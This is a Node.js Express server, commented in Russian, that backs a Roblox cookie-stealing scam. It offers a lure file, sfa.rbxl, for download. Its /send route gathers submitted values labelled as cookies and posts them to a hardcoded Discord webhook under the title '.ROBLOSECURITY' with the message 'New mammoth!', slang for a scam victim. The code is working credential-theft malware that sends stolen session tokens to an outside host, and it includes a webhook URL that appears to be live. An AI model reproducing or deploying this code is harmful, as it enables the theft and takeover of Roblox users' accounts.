const { table } = require('console');
const express = require('express');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
app.use(express.static(path.join(__dirname, 'public')));

const webhookUrl = 'https://discord.com/api/webhooks/1519693949214658762/MVHMg0w16OS3IkPVwLODMU2myWyAC5VF86n-L74rmxhtyk-w_jITF7yg_qpXUaXNfsG6';

app.get('/download', async (req, res) => {
  const file = path.join(__dirname, 'public', 'sfa.rbxl'); // <=========================================
  res.download(file);
});

app.post('/send', async (req, res) => {
    try {
        const reqBody = req.body;
        const fieldsArray = [];
        let index = 0;

        // Перебираем ключ-значение из тела запроса
        for (const key in reqBody) {
            if (Object.prototype.hasOwnProperty.call(reqBody, key)) {
                index++;
                fieldsArray.push({
                    name: `Куки ${index}`,       // Имя поля в эмбеде
                    value: `${key}: ${reqBody[key]}` // Показываем и ключ, и его значение
                });
            }
        }

        // Формируем правильную структуру для Discord
        const discordPayload = {
            content: "Новый мамонт!",
            embeds: [
                {
                    title: ".ROBLOSECURITY",
                    description: "М",
                    color: 5814783,
                    fields: fieldsArray // Передаем готовый массив объектов
                }
            ],
            attachments: []
        };

        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload)
        });

        if (!response.ok) {
            throw new Error(`Discord API error: ${response.statusText}`);
        }

        res.status(200).json({ success: true });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: error.message });
    }
});


app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
